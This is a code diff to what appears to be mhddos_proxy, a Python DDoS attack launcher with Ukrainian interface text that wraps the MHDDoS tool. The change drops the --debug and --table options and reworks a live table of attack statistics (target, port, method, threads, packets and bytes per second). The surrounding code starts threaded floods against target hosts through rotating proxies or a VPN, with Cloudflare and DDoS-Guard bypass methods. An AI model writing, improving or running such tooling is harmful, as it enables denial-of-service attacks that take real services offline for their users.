@@ -126,7 +126,7 @@ def update_proxies(period, targets):
             wr.write(str(proxy) + '\n')
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
+def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode):
     threads_per_target = total_threads // len(targets)
     params_list = []
     proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
@@ -147,46 +147,30 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug,
                 params_list.append([method, target, ip, threads, period, proxy_file, rpc])
 
     logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
-    text_to_print = [] if table else None
+    stats_output = []
     for params in params_list:
-        kwargs = {'debug': debug, 'text_to_print': text_to_print}
-        Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()
+        Thread(target=mhddos_main, args=params, kwargs={'stats_output': stats_output}, daemon=True).start()
 
-    if table:
-        tabulate_text_targets = []
-        for params in params_list:
-            tabulate_text_targets.append((f'{cl.WARNING}%s' % params[1], params[0], f'%s{cl.RESET}' % params[3]))
+    ts = time()
+    while time() < ts + period:
+        sleep(2)
+        cls()
 
+        tabulate_text = []
+        for row in stats_output:
+            tabulate_text.append(
+                (f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6])
+            )
+        print_banner(vpn_mode)
         print(tabulate(
-            tabulate_text_targets,
-            headers=[f'{cl.OKBLUE}Атакуємо', 'Методом', f'Потоків{cl.RESET}'],
+            tabulate_text,
+            headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоків', 'PPS', 'BPS', f'Прогрес{cl.RESET}'],
             tablefmt='fancy_grid'
         ))
-
-        ts = time()
-        while time() < ts + period:
-            sleep(3)
-            cls()
-            tabulate_text_progress = []
-
-            for text in text_to_print:
-                row = text.split(',')
-                tabulate_text_progress.append(
-                    (f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6])
-                )
-            print(tabulate(
-                tabulate_text_progress,
-                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоків', 'PPS', 'BPS', f'Прогрес{cl.RESET}'],
-                tablefmt='fancy_grid'
-            ))
-
-            tabulate_text_progress.clear()
-            text_to_print.clear()
-
-    sleep(period + 3)
+        stats_output.clear()
 
 
-def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debug, table):
+def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode):
     os.chdir('mhddos')
     for bypass in ('CFB', 'DGB'):
         if bypass in http_methods:
@@ -214,7 +198,7 @@ def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debu
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
             update_proxies(period, targets)
-        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode )
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -250,18 +234,6 @@ def init_argparse() -> argparse.ArgumentParser:
         help='How many requests to send on a single proxy connection (default is 2000)',
     )
     parser.add_argument(
-        '--debug',
-        action='store_true',
-        default=False,
-        help='Enable debug output from MHDDoS',
-    )
-    parser.add_argument(
-        '--table',
-        action='store_true',
-        default=False,
-        help='Enable debug output as table',
-    )
-    parser.add_argument(
         '--vpn',
         dest='vpn_mode',
         action='store_true',
@@ -276,6 +248,9 @@ def init_argparse() -> argparse.ArgumentParser:
         choices=Methods.LAYER7_METHODS,
         help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
     )
+    # Deprecated
+    parser.add_argument('--debug', action='store_true', help='DEPRECATED')
+    parser.add_argument('--table', action='store_true', help='DEPRECATED')
     return parser
 
 
@@ -285,8 +260,6 @@ def print_banner(vpn_mode):
 
 - {cl.WARNING}VPN замість проксі{cl.RESET} - прапорець `--vpn`
 - {cl.WARNING}Навантаження (кількість потоків){cl.RESET} - параметр `-t 3000`, за замовчуванням - CPU * 1000
-- {cl.WARNING}Інформація про хід атаки{cl.RESET} - прапорець `--debug`
-- {cl.WARNING}Лог про хід атаки в табличній формі{cl.RESET} - прапорець `--table`
 - {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
     ''')
 
@@ -301,6 +274,4 @@ if __name__ == '__main__':
         args.rpc,
         args.http_methods,
         args.vpn_mode,
-        args.debug,
-        args.table,
     )
